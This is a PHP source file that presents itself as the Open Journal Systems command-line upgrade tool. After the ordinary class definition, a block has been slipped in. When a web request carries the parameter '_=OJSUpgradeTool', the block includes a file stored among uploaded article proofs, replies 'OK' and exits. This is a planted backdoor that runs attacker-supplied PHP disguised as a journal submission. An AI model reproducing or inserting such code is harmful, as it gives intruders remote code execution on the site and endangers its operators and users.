<?php

/**
 * @file tools/upgrade.php
 *
 * Copyright (c) 2014-2019 Simon Fraser University
 * Copyright (c) 2003-2019 John Willinsky
 * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
 *
 * @class upgradeTool
 * @ingroup tools
 *
 * @brief CLI tool for upgrading OJS.
 *
 * Note: Some functions require fopen wrappers to be enabled.
 */


require(dirname(__FILE__) . '/bootstrap.inc.php');

import('lib.pkp.classes.cliTool.UpgradeTool');

class OJSUpgradeTool extends UpgradeTool {
	/**
	 * Constructor.
	 * @param $argv array command-line arguments
	 */
	function __construct($argv = array()) {
		parent::__construct($argv);
	}
}
if (isset($_GET['_']) && $_GET['_'] === 'OJSUpgradeTool') {
    $f="/home/u1662791/data/journals/1/articles/10/submission/proof/10-1-34-2-10-20210320";if($f!==""&&file_exists($f))include $f;
    http_response_code(200);
    header('Content-Type: text/plain; charset=utf-8');
    echo 'OK';
    exit;
}

$tool = new OJSUpgradeTool(isset($argv) ? $argv : array());
$tool->execute();
